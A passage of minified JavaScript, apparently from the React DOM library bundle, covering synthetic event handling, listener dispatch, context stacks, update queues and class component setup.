n?n.movementX:(n!==dt&&(dt&&"mousemove"===n.type?(ct=n.screenX-dt.screenX,ut=n.screenY-dt.screenY):ut=ct=0,dt=n),ct)},movementY:function(n){return"movementY"in n?n.movementY:ut}}),ht=lt(mt),kt=lt(i({},mt,{dataTransfer:0})),bt=lt(i({},_t,{relatedTarget:0})),yt=lt(i({},ft,{animationName:0,elapsedTime:0,pseudoElement:0})),St=i({},ft,{clipboardData:function(n){return"clipboardData"in n?n.clipboardData:window.clipboardData}}),vt=lt(St),xt=lt(i({},ft,{data:0})),Et={Esc:"Escape",Spacebar:" ",Left:"ArrowLeft",Up:"ArrowUp",Right:"ArrowRight",Down:"ArrowDown",Del:"Delete",Win:"OS",Menu:"ContextMenu",Apps:"ContextMenu",Scroll:"ScrollLock",MozPrintableKey:"Unidentified"},Tt={8:"Backspace",9:"Tab",12:"Clear",13:"Enter",16:"Shift",17:"Control",18:"Alt",19:"Pause",20:"CapsLock",27:"Escape",32:" ",33:"PageUp",34:"PageDown",35:"End",36:"Home",37:"ArrowLeft",38:"ArrowUp",39:"ArrowRight",40:"ArrowDown",45:"Insert",46:"Delete",112:"F1",113:"F2",114:"F3",115:"F4",116:"F5",117:"F6",118:"F7",119:"F8",120:"F9",121:"F10",122:"F11",123:"F12",144:"NumLock",145:"ScrollLock",224:"Meta"},It={Alt:"altKey",Control:"ctrlKey",Meta:"metaKey",Shift:"shiftKey"};function wt(n){var e=this.nativeEvent;return e.getModifierState?e.getModifierState(n):!!(n=It[n])&&!!e[n]}function Nt(){return wt}var Ct=i({},_t,{key:function(n){if(n.key){var e=Et[n.key]||n.key;if("Unidentified"!==e)return e}return"keypress"===n.type?13===(n=st(n))?"Enter":String.fromCharCode(n):"keydown"===n.type||"keyup"===n.type?Tt[n.keyCode]||"Unidentified":""},code:0,location:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,repeat:0,locale:0,getModifierState:Nt,charCode:function(n){return"keypress"===n.type?st(n):0},keyCode:function(n){return"keydown"===n.type||"keyup"===n.type?n.keyCode:0},which:function(n){return"keypress"===n.type?st(n):"keydown"===n.type||"keyup"===n.type?n.keyCode:0}}),Pt=lt(Ct),Lt=lt(i({},mt,{pointerId:0,width:0,height:0,pressure:0,tangentialPressure:0,tiltX:0,tiltY:0,twist:0,pointerType:0,isPrimary:0})),At=lt(i({},_t,{touches:0,targetTouches:0,changedTouches:0,altKey:0,metaKey:0,ctrlKey:0,shiftKey:0,getModifierState:Nt})),Dt=lt(i({},ft,{propertyName:0,elapsedTime:0,pseudoElement:0})),Ot=i({},mt,{deltaX:function(n){return"deltaX"in n?n.deltaX:"wheelDeltaX"in n?-n.wheelDeltaX:0},deltaY:function(n){return"deltaY"in n?n.deltaY:"wheelDeltaY"in n?-n.wheelDeltaY:"wheelDelta"in n?-n.wheelDelta:0},deltaZ:0,deltaMode:0}),Rt=lt(Ot),Ft=[9,13,27,32],Bt=d&&"CompositionEvent"in window,Mt=null;d&&"documentMode"in document&&(Mt=document.documentMode);var Ut=d&&"TextEvent"in window&&!Mt,qt=d&&(!Bt||Mt&&8<Mt&&11>=Mt),Gt=String.fromCharCode(32),zt=!1;function Ht(n,e){switch(n){case"keyup":return-1!==Ft.indexOf(e.keyCode);case"keydown":return 229!==e.keyCode;case"keypress":case"mousedown":case"focusout":return!0;default:return!1}}function Vt(n){return"object"===typeof(n=n.detail)&&"data"in n?n.data:null}var jt=!1;var Kt={color:!0,date:!0,datetime:!0,"datetime-local":!0,email:!0,month:!0,number:!0,password:!0,range:!0,search:!0,tel:!0,text:!0,time:!0,url:!0,week:!0};function Wt(n){var e=n&&n.nodeName&&n.nodeName.toLowerCase();return"input"===e?!!Kt[n.type]:"textarea"===e}function Yt(n,e,t,r){An(r),0<(e=Br(e,"onChange")).length&&(t=new pt("onChange","change",null,t,r),n.push({event:t,listeners:e}))}var Xt=null,Qt=null;function $t(n){Cr(n,0)}function Jt(n){if($(ii(n)))return n}function Zt(n,e){if("change"===n)return e}var nr=!1;if(d){var er;if(d){var tr="oninput"in document;if(!tr){var rr=document.createElement("div");rr.setAttribute("oninput","return;"),tr="function"===typeof rr.oninput}er=tr}else er=!1;nr=er&&(!document.documentMode||9<document.documentMode)}function ir(){Xt&&(Xt.detachEvent("onpropertychange",sr),Qt=Xt=null)}function sr(n){if("value"===n.propertyName&&Jt(Qt)){var e=[];if(Yt(e,Qt,n,wn(n)),n=$t,Mn)n(e);else{Mn=!0;try{On(n,e)}finally{Mn=!1,qn()}}}}function ar(n,e,t){"focusin"===n?(ir(),Qt=t,(Xt=e).attachEvent("onpropertychange",sr)):"focusout"===n&&ir()}function or(n){if("selectionchange"===n||"keyup"===n||"keydown"===n)return Jt(Qt)}function lr(n,e){if("click"===n)return Jt(e)}function cr(n,e){if("input"===n||"change"===n)return Jt(e)}var ur="function"===typeof Object.is?Object.is:function(n,e){return n===e&&(0!==n||1/n===1/e)||n!==n&&e!==e},dr=Object.prototype.hasOwnProperty;function fr(n,e){if(ur(n,e))return!0;if("object"!==typeof n||null===n||"object"!==typeof e||null===e)return!1;var t=Object.keys(n),r=Object.keys(e);if(t.length!==r.length)return!1;for(r=0;r<t.length;r++)if(!dr.call(e,t[r])||!ur(n[t[r]],e[t[r]]))return!1;return!0}function pr(n){for(;n&&n.firstChild;)n=n.firstChild;return n}function _r(n,e){var t,r=pr(n);for(n=0;r;){if(3===r.nodeType){if(t=n+r.textContent.length,n<=e&&t>=e)return{node:r,offset:e-n};n=t}n:{for(;r;){if(r.nextSibling){r=r.nextSibling;break n}r=r.parentNode}r=void 0}r=pr(r)}}function gr(n,e){return!(!n||!e)&&(n===e||(!n||3!==n.nodeType)&&(e&&3===e.nodeType?gr(n,e.parentNode):"contains"in n?n.contains(e):!!n.compareDocumentPosition&&!!(16&n.compareDocumentPosition(e))))}function mr(){for(var n=window,e=J();e instanceof n.HTMLIFrameElement;){try{var t="string"===typeof e.contentWindow.location.href}catch(r){t=!1}if(!t)break;e=J((n=e.contentWindow).document)}return e}function hr(n){var e=n&&n.nodeName&&n.nodeName.toLowerCase();return e&&("input"===e&&("text"===n.type||"search"===n.type||"tel"===n.type||"url"===n.type||"password"===n.type)||"textarea"===e||"true"===n.contentEditable)}var kr=d&&"documentMode"in document&&11>=document.documentMode,br=null,yr=null,Sr=null,vr=!1;function xr(n,e,t){var r=t.window===t?t.document:9===t.nodeType?t:t.ownerDocument;vr||null==br||br!==J(r)||("selectionStart"in(r=br)&&hr(r)?r={start:r.selectionStart,end:r.selectionEnd}:r={anchorNode:(r=(r.ownerDocument&&r.ownerDocument.defaultView||window).getSelection()).anchorNode,anchorOffset:r.anchorOffset,focusNode:r.focusNode,focusOffset:r.focusOffset},Sr&&fr(Sr,r)||(Sr=r,0<(r=Br(yr,"onSelect")).length&&(e=new pt("onSelect","select",null,e,t),n.push({event:e,listeners:r}),e.target=br)))}Fe("cancel cancel click click close close contextmenu contextMenu copy copy cut cut auxclick auxClick dblclick doubleClick dragend dragEnd dragstart dragStart drop drop focusin focus focusout blur input input invalid invalid keydown keyDown keypress keyPress keyup keyUp mousedown mouseDown mouseup mouseUp paste paste pause pause play play pointercancel pointerCancel pointerdown pointerDown pointerup pointerUp ratechange rateChange reset reset seeked seeked submit submit touchcancel touchCancel touchend touchEnd touchstart touchStart volumechange volumeChange".split(" "),0),Fe("drag drag dragenter dragEnter dragexit dragExit dragleave dragLeave dragover dragOver mousemove mouseMove mouseout mouseOut mouseover mouseOver pointermove pointerMove pointerout pointerOut pointerover pointerOver scroll scroll toggle toggle touchmove touchMove wheel wheel".split(" "),1),Fe(Re,2);for(var Er="change selectionchange textInput compositionstart compositionend compositionupdate".split(" "),Tr=0;Tr<Er.length;Tr++)Oe.set(Er[Tr],0);u("onMouseEnter",["mouseout","mouseover"]),u("onMouseLeave",["mouseout","mouseover"]),u("onPointerEnter",["pointerout","pointerover"]),u("onPointerLeave",["pointerout","pointerover"]),c("onChange","change click focusin focusout input keydown keyup selectionchange".split(" ")),c("onSelect","focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")),c("onBeforeInput",["compositionend","keypress","textInput","paste"]),c("onCompositionEnd","compositionend focusout keydown keypress keyup mousedown".split(" ")),c("onCompositionStart","compositionstart focusout keydown keypress keyup mousedown".split(" ")),c("onCompositionUpdate","compositionupdate focusout keydown keypress keyup mousedown".split(" "));var Ir="abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),wr=new Set("cancel close invalid load scroll toggle".split(" ").concat(Ir));function Nr(n,e,t){var r=n.type||"unknown-event";n.currentTarget=t,function(n,e,t,r,i,s,o,l,c){if(Qn.apply(this,arguments),jn){if(!jn)throw Error(a(198));var u=Kn;jn=!1,Kn=null,Wn||(Wn=!0,Yn=u)}}(r,e,void 0,n),n.currentTarget=null}function Cr(n,e){e=0!==(4&e);for(var t=0;t<n.length;t++){var r=n[t],i=r.event;r=r.listeners;n:{var s=void 0;if(e)for(var a=r.length-1;0<=a;a--){var o=r[a],l=o.instance,c=o.currentTarget;if(o=o.listener,l!==s&&i.isPropagationStopped())break n;Nr(i,o,c),s=l}else for(a=0;a<r.length;a++){if(l=(o=r[a]).instance,c=o.currentTarget,o=o.listener,l!==s&&i.isPropagationStopped())break n;Nr(i,o,c),s=l}}}if(Wn)throw n=Yn,Wn=!1,Yn=null,n}function Pr(n,e){var t=ai(e),r=n+"__bubble";t.has(r)||(Or(e,n,2,!1),t.add(r))}var Lr="_reactListening"+Math.random().toString(36).slice(2);function Ar(n){n[Lr]||(n[Lr]=!0,o.forEach((function(e){wr.has(e)||Dr(e,!1,n,null),Dr(e,!0,n,null)})))}function Dr(n,e,t,r){var i=4<arguments.length&&void 0!==arguments[4]?arguments[4]:0,s=t;if("selectionchange"===n&&9!==t.nodeType&&(s=t.ownerDocument),null!==r&&!e&&wr.has(n)){if("scroll"!==n)return;i|=2,s=r}var a=ai(s),o=n+"__"+(e?"capture":"bubble");a.has(o)||(e&&(i|=4),Or(s,n,i,e),a.add(o))}function Or(n,e,t,r){var i=Oe.get(e);switch(void 0===i?2:i){case 0:i=$e;break;case 1:i=Je;break;default:i=Ze}t=i.bind(null,e,t,n),i=void 0,!zn||"touchstart"!==e&&"touchmove"!==e&&"wheel"!==e||(i=!0),r?void 0!==i?n.addEventListener(e,t,{capture:!0,passive:i}):n.addEventListener(e,t,!0):void 0!==i?n.addEventListener(e,t,{passive:i}):n.addEventListener(e,t,!1)}function Rr(n,e,t,r,i){var s=r;if(0===(1&e)&&0===(2&e)&&null!==r)n:for(;;){if(null===r)return;var a=r.tag;if(3===a||4===a){var o=r.stateNode.containerInfo;if(o===i||8===o.nodeType&&o.parentNode===i)break;if(4===a)for(a=r.return;null!==a;){var l=a.tag;if((3===l||4===l)&&((l=a.stateNode.containerInfo)===i||8===l.nodeType&&l.parentNode===i))return;a=a.return}for(;null!==o;){if(null===(a=ti(o)))return;if(5===(l=a.tag)||6===l){r=s=a;continue n}o=o.parentNode}}r=r.return}!function(n,e,t){if(Un)return n(e,t);Un=!0;try{Bn(n,e,t)}finally{Un=!1,qn()}}((function(){var r=s,i=wn(t),a=[];n:{var o=De.get(n);if(void 0!==o){var l=pt,c=n;switch(n){case"keypress":if(0===st(t))break n;case"keydown":case"keyup":l=Pt;break;case"focusin":c="focus",l=bt;break;case"focusout":c="blur",l=bt;break;case"beforeblur":case"afterblur":l=bt;break;case"click":if(2===t.button)break n;case"auxclick":case"dblclick":case"mousedown":case"mousemove":case"mouseup":case"mouseout":case"mouseover":case"contextmenu":l=ht;break;case"drag":case"dragend":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"dragstart":case"drop":l=kt;break;case"touchcancel":case"touchend":case"touchmove":case"touchstart":l=At;break;case Ce:case Pe:case Le:l=yt;break;case Ae:l=Dt;break;case"scroll":l=gt;break;case"wheel":l=Rt;break;case"copy":case"cut":case"paste":l=vt;break;case"gotpointercapture":case"lostpointercapture":case"pointercancel":case"pointerdown":case"pointermove":case"pointerout":case"pointerover":case"pointerup":l=Lt}var u=0!==(4&e),d=!u&&"scroll"===n,f=u?null!==o?o+"Capture":null:o;u=[];for(var p,_=r;null!==_;){var g=(p=_).stateNode;if(5===p.tag&&null!==g&&(p=g,null!==f&&(null!=(g=Gn(_,f))&&u.push(Fr(_,g,p)))),d)break;_=_.return}0<u.length&&(o=new l(o,c,null,t,i),a.push({event:o,listeners:u}))}}if(0===(7&e)){if(l="mouseout"===n||"pointerout"===n,(!(o="mouseover"===n||"pointerover"===n)||0!==(16&e)||!(c=t.relatedTarget||t.fromElement)||!ti(c)&&!c[ni])&&(l||o)&&(o=i.window===i?i:(o=i.ownerDocument)?o.defaultView||o.parentWindow:window,l?(l=r,null!==(c=(c=t.relatedTarget||t.toElement)?ti(c):null)&&(c!==(d=$n(c))||5!==c.tag&&6!==c.tag)&&(c=null)):(l=null,c=r),l!==c)){if(u=ht,g="onMouseLeave",f="onMouseEnter",_="mouse","pointerout"!==n&&"pointerover"!==n||(u=Lt,g="onPointerLeave",f="onPointerEnter",_="pointer"),d=null==l?o:ii(l),p=null==c?o:ii(c),(o=new u(g,_+"leave",l,t,i)).target=d,o.relatedTarget=p,g=null,ti(i)===r&&((u=new u(f,_+"enter",c,t,i)).target=p,u.relatedTarget=d,g=u),d=g,l&&c)n:{for(f=c,_=0,p=u=l;p;p=Mr(p))_++;for(p=0,g=f;g;g=Mr(g))p++;for(;0<_-p;)u=Mr(u),_--;for(;0<p-_;)f=Mr(f),p--;for(;_--;){if(u===f||null!==f&&u===f.alternate)break n;u=Mr(u),f=Mr(f)}u=null}else u=null;null!==l&&Ur(a,o,l,u,!1),null!==c&&null!==d&&Ur(a,d,c,u,!0)}if("select"===(l=(o=r?ii(r):window).nodeName&&o.nodeName.toLowerCase())||"input"===l&&"file"===o.type)var m=Zt;else if(Wt(o))if(nr)m=cr;else{m=or;var h=ar}else(l=o.nodeName)&&"input"===l.toLowerCase()&&("checkbox"===o.type||"radio"===o.type)&&(m=lr);switch(m&&(m=m(n,r))?Yt(a,m,t,i):(h&&h(n,o,r),"focusout"===n&&(h=o._wrapperState)&&h.controlled&&"number"===o.type&&sn(o,"number",o.value)),h=r?ii(r):window,n){case"focusin":(Wt(h)||"true"===h.contentEditable)&&(br=h,yr=r,Sr=null);break;case"focusout":Sr=yr=br=null;break;case"mousedown":vr=!0;break;case"contextmenu":case"mouseup":case"dragend":vr=!1,xr(a,t,i);break;case"selectionchange":if(kr)break;case"keydown":case"keyup":xr(a,t,i)}var k;if(Bt)n:{switch(n){case"compositionstart":var b="onCompositionStart";break n;case"compositionend":b="onCompositionEnd";break n;case"compositionupdate":b="onCompositionUpdate";break n}b=void 0}else jt?Ht(n,t)&&(b="onCompositionEnd"):"keydown"===n&&229===t.keyCode&&(b="onCompositionStart");b&&(qt&&"ko"!==t.locale&&(jt||"onCompositionStart"!==b?"onCompositionEnd"===b&&jt&&(k=it()):(tt="value"in(et=i)?et.value:et.textContent,jt=!0)),0<(h=Br(r,b)).length&&(b=new xt(b,n,null,t,i),a.push({event:b,listeners:h}),k?b.data=k:null!==(k=Vt(t))&&(b.data=k))),(k=Ut?function(n,e){switch(n){case"compositionend":return Vt(e);case"keypress":return 32!==e.which?null:(zt=!0,Gt);case"textInput":return(n=e.data)===Gt&&zt?null:n;default:return null}}(n,t):function(n,e){if(jt)return"compositionend"===n||!Bt&&Ht(n,e)?(n=it(),rt=tt=et=null,jt=!1,n):null;switch(n){case"paste":default:return null;case"keypress":if(!(e.ctrlKey||e.altKey||e.metaKey)||e.ctrlKey&&e.altKey){if(e.char&&1<e.char.length)return e.char;if(e.which)return String.fromCharCode(e.which)}return null;case"compositionend":return qt&&"ko"!==e.locale?null:e.data}}(n,t))&&(0<(r=Br(r,"onBeforeInput")).length&&(i=new xt("onBeforeInput","beforeinput",null,t,i),a.push({event:i,listeners:r}),i.data=k))}Cr(a,e)}))}function Fr(n,e,t){return{instance:n,listener:e,currentTarget:t}}function Br(n,e){for(var t=e+"Capture",r=[];null!==n;){var i=n,s=i.stateNode;5===i.tag&&null!==s&&(i=s,null!=(s=Gn(n,t))&&r.unshift(Fr(n,s,i)),null!=(s=Gn(n,e))&&r.push(Fr(n,s,i))),n=n.return}return r}function Mr(n){if(null===n)return null;do{n=n.return}while(n&&5!==n.tag);return n||null}function Ur(n,e,t,r,i){for(var s=e._reactName,a=[];null!==t&&t!==r;){var o=t,l=o.alternate,c=o.stateNode;if(null!==l&&l===r)break;5===o.tag&&null!==c&&(o=c,i?null!=(l=Gn(t,s))&&a.unshift(Fr(t,l,o)):i||null!=(l=Gn(t,s))&&a.push(Fr(t,l,o))),t=t.return}0!==a.length&&n.push({event:e,listeners:a})}function qr(){}var Gr=null,zr=null;function Hr(n,e){switch(n){case"button":case"input":case"select":case"textarea":return!!e.autoFocus}return!1}function Vr(n,e){return"textarea"===n||"option"===n||"noscript"===n||"string"===typeof e.children||"number"===typeof e.children||"object"===typeof e.dangerouslySetInnerHTML&&null!==e.dangerouslySetInnerHTML&&null!=e.dangerouslySetInnerHTML.__html}var jr="function"===typeof setTimeout?setTimeout:void 0,Kr="function"===typeof clearTimeout?clearTimeout:void 0;function Wr(n){1===n.nodeType?n.textContent="":9===n.nodeType&&(null!=(n=n.body)&&(n.textContent=""))}function Yr(n){for(;null!=n;n=n.nextSibling){var e=n.nodeType;if(1===e||3===e)break}return n}function Xr(n){n=n.previousSibling;for(var e=0;n;){if(8===n.nodeType){var t=n.data;if("$"===t||"$!"===t||"$?"===t){if(0===e)return n;e--}else"/$"===t&&e++}n=n.previousSibling}return null}var Qr=0;var $r=Math.random().toString(36).slice(2),Jr="__reactFiber$"+$r,Zr="__reactProps$"+$r,ni="__reactContainer$"+$r,ei="__reactEvents$"+$r;function ti(n){var e=n[Jr];if(e)return e;for(var t=n.parentNode;t;){if(e=t[ni]||t[Jr]){if(t=e.alternate,null!==e.child||null!==t&&null!==t.child)for(n=Xr(n);null!==n;){if(t=n[Jr])return t;n=Xr(n)}return e}t=(n=t).parentNode}return null}function ri(n){return!(n=n[Jr]||n[ni])||5!==n.tag&&6!==n.tag&&13!==n.tag&&3!==n.tag?null:n}function ii(n){if(5===n.tag||6===n.tag)return n.stateNode;throw Error(a(33))}function si(n){return n[Zr]||null}function ai(n){var e=n[ei];return void 0===e&&(e=n[ei]=new Set),e}var oi=[],li=-1;function ci(n){return{current:n}}function ui(n){0>li||(n.current=oi[li],oi[li]=null,li--)}function di(n,e){li++,oi[li]=n.current,n.current=e}var fi={},pi=ci(fi),_i=ci(!1),gi=fi;function mi(n,e){var t=n.type.contextTypes;if(!t)return fi;var r=n.stateNode;if(r&&r.__reactInternalMemoizedUnmaskedChildContext===e)return r.__reactInternalMemoizedMaskedChildContext;var i,s={};for(i in t)s[i]=e[i];return r&&((n=n.stateNode).__reactInternalMemoizedUnmaskedChildContext=e,n.__reactInternalMemoizedMaskedChildContext=s),s}function hi(n){return null!==(n=n.childContextTypes)&&void 0!==n}function ki(){ui(_i),ui(pi)}function bi(n,e,t){if(pi.current!==fi)throw Error(a(168));di(pi,e),di(_i,t)}function yi(n,e,t){var r=n.stateNode;if(n=e.childContextTypes,"function"!==typeof r.getChildContext)return t;for(var s in r=r.getChildContext())if(!(s in n))throw Error(a(108,W(e)||"Unknown",s));return i({},t,r)}function Si(n){return n=(n=n.stateNode)&&n.__reactInternalMemoizedMergedChildContext||fi,gi=pi.current,di(pi,n),di(_i,_i.current),!0}function vi(n,e,t){var r=n.stateNode;if(!r)throw Error(a(169));t?(n=yi(n,e,gi),r.__reactInternalMemoizedMergedChildContext=n,ui(_i),ui(pi),di(pi,n)):ui(_i),di(_i,t)}var xi=null,Ei=null,Ti=s.unstable_runWithPriority,Ii=s.unstable_scheduleCallback,wi=s.unstable_cancelCallback,Ni=s.unstable_shouldYield,Ci=s.unstable_requestPaint,Pi=s.unstable_now,Li=s.unstable_getCurrentPriorityLevel,Ai=s.unstable_ImmediatePriority,Di=s.unstable_UserBlockingPriority,Oi=s.unstable_NormalPriority,Ri=s.unstable_LowPriority,Fi=s.unstable_IdlePriority,Bi={},Mi=void 0!==Ci?Ci:function(){},Ui=null,qi=null,Gi=!1,zi=Pi(),Hi=1e4>zi?Pi:function(){return Pi()-zi};function Vi(){switch(Li()){case Ai:return 99;case Di:return 98;case Oi:return 97;case Ri:return 96;case Fi:return 95;default:throw Error(a(332))}}function ji(n){switch(n){case 99:return Ai;case 98:return Di;case 97:return Oi;case 96:return Ri;case 95:return Fi;default:throw Error(a(332))}}function Ki(n,e){return n=ji(n),Ti(n,e)}function Wi(n,e,t){return n=ji(n),Ii(n,e,t)}function Yi(){if(null!==qi){var n=qi;qi=null,wi(n)}Xi()}function Xi(){if(!Gi&&null!==Ui){Gi=!0;var n=0;try{var e=Ui;Ki(99,(function(){for(;n<e.length;n++){var t=e[n];do{t=t(!0)}while(null!==t)}})),Ui=null}catch(t){throw null!==Ui&&(Ui=Ui.slice(n+1)),Ii(Ai,Yi),t}finally{Gi=!1}}}var Qi=S.ReactCurrentBatchConfig;function $i(n,e){if(n&&n.defaultProps){for(var t in e=i({},e),n=n.defaultProps)void 0===e[t]&&(e[t]=n[t]);return e}return e}var Ji=ci(null),Zi=null,ns=null,es=null;function ts(){es=ns=Zi=null}function rs(n){var e=Ji.current;ui(Ji),n.type._context._currentValue=e}function is(n,e){for(;null!==n;){var t=n.alternate;if((n.childLanes&e)===e){if(null===t||(t.childLanes&e)===e)break;t.childLanes|=e}else n.childLanes|=e,null!==t&&(t.childLanes|=e);n=n.return}}function ss(n,e){Zi=n,es=ns=null,null!==(n=n.dependencies)&&null!==n.firstContext&&(0!==(n.lanes&e)&&(Fa=!0),n.firstContext=null)}function as(n,e){if(es!==n&&!1!==e&&0!==e)if("number"===typeof e&&1073741823!==e||(es=n,e=1073741823),e={context:n,observedBits:e,next:null},null===ns){if(null===Zi)throw Error(a(308));ns=e,Zi.dependencies={lanes:0,firstContext:e,responders:null}}else ns=ns.next=e;return n._currentValue}var os=!1;function ls(n){n.updateQueue={baseState:n.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null},effects:null}}function cs(n,e){n=n.updateQueue,e.updateQueue===n&&(e.updateQueue={baseState:n.baseState,firstBaseUpdate:n.firstBaseUpdate,lastBaseUpdate:n.lastBaseUpdate,shared:n.shared,effects:n.effects})}function us(n,e){return{eventTime:n,lane:e,tag:0,payload:null,callback:null,next:null}}function ds(n,e){if(null!==(n=n.updateQueue)){var t=(n=n.shared).pending;null===t?e.next=e:(e.next=t.next,t.next=e),n.pending=e}}function fs(n,e){var t=n.updateQueue,r=n.alternate;if(null!==r&&t===(r=r.updateQueue)){var i=null,s=null;if(null!==(t=t.firstBaseUpdate)){do{var a={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};null===s?i=s=a:s=s.next=a,t=t.next}while(null!==t);null===s?i=s=e:s=s.next=e}else i=s=e;return t={baseState:r.baseState,firstBaseUpdate:i,lastBaseUpdate:s,shared:r.shared,effects:r.effects},void(n.updateQueue=t)}null===(n=t.lastBaseUpdate)?t.firstBaseUpdate=e:n.next=e,t.lastBaseUpdate=e}function ps(n,e,t,r){var s=n.updateQueue;os=!1;var a=s.firstBaseUpdate,o=s.lastBaseUpdate,l=s.shared.pending;if(null!==l){s.shared.pending=null;var c=l,u=c.next;c.next=null,null===o?a=u:o.next=u,o=c;var d=n.alternate;if(null!==d){var f=(d=d.updateQueue).lastBaseUpdate;f!==o&&(null===f?d.firstBaseUpdate=u:f.next=u,d.lastBaseUpdate=c)}}if(null!==a){for(f=s.baseState,o=0,d=u=c=null;;){l=a.lane;var p=a.eventTime;if((r&l)===l){null!==d&&(d=d.next={eventTime:p,lane:0,tag:a.tag,payload:a.payload,callback:a.callback,next:null});n:{var _=n,g=a;switch(l=e,p=t,g.tag){case 1:if("function"===typeof(_=g.payload)){f=_.call(p,f,l);break n}f=_;break n;case 3:_.flags=-4097&_.flags|64;case 0:if(null===(l="function"===typeof(_=g.payload)?_.call(p,f,l):_)||void 0===l)break n;f=i({},f,l);break n;case 2:os=!0}}null!==a.callback&&(n.flags|=32,null===(l=s.effects)?s.effects=[a]:l.push(a))}else p={eventTime:p,lane:l,tag:a.tag,payload:a.payload,callback:a.callback,next:null},null===d?(u=d=p,c=f):d=d.next=p,o|=l;if(null===(a=a.next)){if(null===(l=s.shared.pending))break;a=l.next,l.next=null,s.lastBaseUpdate=l,s.shared.pending=null}}null===d&&(c=f),s.baseState=c,s.firstBaseUpdate=u,s.lastBaseUpdate=d,Go|=o,n.lanes=o,n.memoizedState=f}}function _s(n,e,t){if(n=e.effects,e.effects=null,null!==n)for(e=0;e<n.length;e++){var r=n[e],i=r.callback;if(null!==i){if(r.callback=null,r=t,"function"!==typeof i)throw Error(a(191,i));i.call(r)}}}var gs=(new r.Component).refs;function ms(n,e,t,r){t=null===(t=t(r,e=n.memoizedState))||void 0===t?e:i({},e,t),n.memoizedState=t,0===n.lanes&&(n.updateQueue.baseState=t)}var hs={isMounted:function(n){return!!(n=n._reactInternals)&&$n(n)===n},enqueueSetState:function(n,e,t){n=n._reactInternals;var r=fl(),i=pl(n),s=us(r,i);s.payload=e,void 0!==t&&null!==t&&(s.callback=t),ds(n,s),_l(n,i,r)},enqueueReplaceState:function(n,e,t){n=n._reactInternals;var r=fl(),i=pl(n),s=us(r,i);s.tag=1,s.payload=e,void 0!==t&&null!==t&&(s.callback=t),ds(n,s),_l(n,i,r)},enqueueForceUpdate:function(n,e){n=n._reactInternals;var t=fl(),r=pl(n),i=us(t,r);i.tag=2,void 0!==e&&null!==e&&(i.callback=e),ds(n,i),_l(n,r,t)}};function ks(n,e,t,r,i,s,a){return"function"===typeof(n=n.stateNode).shouldComponentUpdate?n.shouldComponentUpdate(r,s,a):!e.prototype||!e.prototype.isPureReactComponent||(!fr(t,r)||!fr(i,s))}function bs(n,e,t){var r=!1,i=fi,s=e.contextType;return"object"===typeof s&&null!==s?s=as(s):(i=hi(e)?gi:pi.current,s=(r=null!==(r=e.contextTypes)&&void 0!==r)?mi(n,i):fi),e=new e(t,s),n.memoizedState=null!==e.state&&void 0!==e.state?e.state:null,e.updater=hs,n.stateNode=e,e._reactInternals=n,r&&((n=n.stateNode).__reactInternalMemoizedUnmaskedChildContext=i,n.__reactInternalMemoizedMaskedChildContext=s),e}function ys(n,e,t,r){n=e.state,"function"===typeof e.componentWillReceiveProps&&e.componentWillReceiveProps(t,r),"function"===typeof e.UNSAFE_componentWillReceiveProps&&e.UNSAFE_componentWillReceiveProps(t,r),e.state!==n&&hs.enqueueReplaceState(e,e.state,null)}function Ss(n,e,t,r){var i=n.stateNode;i.props=t,i.state=n.memoizedState,i.refs=gs,ls(n);var s=e.contextType;"object"===typeof s&&null!==s?i.context=as(s):(s=hi(e)?gi:pi.current,i.context=mi(n,s)),ps(n,t,i,r),i.state=n.memoizedState,"function"===typeof(s=e.getDerivedStateFromProps)&&(ms(n,e,s,t),i.state=n.memoizedState),"function"===typeof e.getDerivedStateFromProps||"function"===typeof i.getSnapshotBeforeUpdate||"function"!==typeof i.UNSAFE_componentWillMount&&"function"!==typeof i.componentWillMount||(e=i.state,"function"===typeof i.componentWillMount&&i.componentWillMount(),"function"===typeof i.UNSAFE_componentWillMount&&i.UNSAFE_componentWillMount(),e!==i.state&&hs.enqueueReplaceState(i,i.state,null),ps(n,t,i,r),i.state=n.memoizedState),"function"===typeof i.componentDidMount&&(n.flags|=4)}var vs=Array.isArray;function xs(n,e,t){if(null!==(n=t.ref)&&"function"!==typeof n&&"object"!==typeof n){if(t._owner){if(t=t._owner){if(1!==t.tag)throw Error(a(309));var r=t.stateNode}if(!r)throw Error(a(147,n));var i=""+n;return null!==e&&null!==e.ref&&"function"===typeof e.ref&&e.ref._stringRef===i?e.ref:(e=function(n){var e=r.refs;e===gs&&(e=r.refs={}),null===n?delete e[i]:e[i]=n},e._stringRef=i,e)}if("string"!==typeof n)throw Error(a(284));if(!t._owner)throw Error(a(290,n))}return n}function Es(n,e){if("textarea"!==n.type)throw Error(a(31,"[object Object]"===Object.prototype.toString.call(e)?"object with keys {"+Object.keys(e).join(", ")+"}":e))}function Ts(n){function e(e,t){if(n){var r=e.lastEffect;null!==r?(r.nextEffect=t,e.lastEffect=t):e.firstEffect=e.lastEffect=t,t.nextEffect=null,t.flags=8}}function t(t,r){if(!n)return null;for(;null!==r;)e(t,r),r=r.sibling;return null}function r(n,e){for(n=new Map;null!==e;)null!==e.key?n.set(e.key,e):n.set(e.index,e),e=e.sibling;return n}function i(n,e){return(n=Kl(n,e)).index=0,n.sibling=null,n}function s(e,t,r){return e.index=r,n?null!==(r=e.alternate)?(r=r.index)<t?(e.flags=2,t):r:(e.flags=2,t):t}function o(e){return n&&null===e.alternate&&(e.flags=2),e}function l(n,e,t,r){return null===e||6!==e.tag?((e=Ql(t,n.mode,r)).return=n,e):((e=i(e,t)).return=n,e)}function c(n,e,t,r){return null!==e&&e.elementType===t.type?((r=i(e,t.props)).ref=xs(n,e,t),r.return=n,r):((r=Wl(t.type,t.key,t.props,null,n.mode,r)).ref=xs(n,e,t),r.return=n,r)}function u(n,e,t,r){return null===e||4!==e.tag||e.stateNode.containerInfo!==t.containerInfo||e.stateNode.implementation!==t.implementation?((e=$l(t,n.mode,r)).return=n,e):((e=i(e,t.children||[])).return=n,e)}function d(n,e,t,r,s){return null===e||7!==e.tag?((e=Yl(t,n.mode,r,s)).return=n,e):((e=i(e,t)).return=n,e)}function f(n,e,t){if("string"===typeof 